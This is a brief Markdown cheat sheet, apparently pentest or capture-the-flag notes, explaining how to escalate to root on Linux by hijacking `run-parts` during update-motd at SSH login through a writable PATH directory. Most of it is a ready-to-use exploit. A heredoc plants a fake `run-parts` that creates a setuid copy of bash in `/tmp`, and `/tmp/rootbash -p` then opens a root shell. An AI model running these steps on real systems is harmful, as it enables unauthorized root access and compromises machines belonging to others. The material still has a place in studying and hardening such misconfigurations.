# run-parts PATH Hijack (update-motd)

When root runs `run-parts` via `/etc/update-motd.d` on user login (SSH) and the PATH includes a user-writable directory before system dirs, plant a fake `run-parts` binary there.

## Detect the Vulnerability
Use pspy to watch what root runs on SSH login:
```
pspy64
```
Look for: `UID=0 ... run-parts --lsbsysinit /etc/update-motd.d`

Check if the PATH used includes writable dirs (e.g., `/usr/local/bin`, `/usr/local/sbin`):
```bash
env | grep PATH
ls -la /usr/local/bin /usr/local/sbin
```

## Exploit
Write a malicious `run-parts` to the writable PATH directory:
```bash
cat > /usr/local/bin/run-parts << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
EOF
chmod +x /usr/local/bin/run-parts
```

## Trigger
SSH in again (in a new terminal) — root will call your `run-parts`:
```bash
/tmp/rootbash -p
```

## Notes
- Relies on user being in a group (e.g., `staff`) with write access to PATH dirs
- Check group membership: `id`
- `/etc/update-motd.d/` scripts run as root on every SSH login
- PATH is inherited from the `env -i PATH=...` call, check pspy output for exact dirs
